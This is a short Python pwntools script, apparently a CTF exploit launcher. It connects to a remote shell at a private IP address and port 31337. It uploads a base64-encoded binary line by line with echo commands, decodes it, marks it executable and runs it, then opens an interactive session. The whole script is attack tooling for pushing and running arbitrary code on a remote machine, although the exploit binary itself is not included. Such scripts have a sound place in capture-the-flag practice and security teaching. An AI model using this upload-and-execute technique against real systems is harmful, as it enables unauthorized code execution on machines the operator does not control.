from pwn import *

context.log_level = "debug"

with open("ooo.bin", "r") as f:
    code = f.readlines()
# print(code)
# code = code[:2]
r = remote("10.99.111.110", "31337")

r.recvuntil("/home/user $")

print("[+] VM is up now, start your exploit")
r.sendline("touch exp")
r.recvuntil("/home/user $")
for i in range(len(code)):
    aaa = code[i].replace("\n", "")
    r.sendline(f"echo {aaa} >> exp")
    r.recvuntil("/home/user $")
print("[+] Base64 payload upload done.")
r.sendline("base64 -d exp > aaa")
r.sendlineafter("/home/user $", "chmod +x aaa")
r.sendlineafter("/home/user $", "./aaa")
r.interactive()
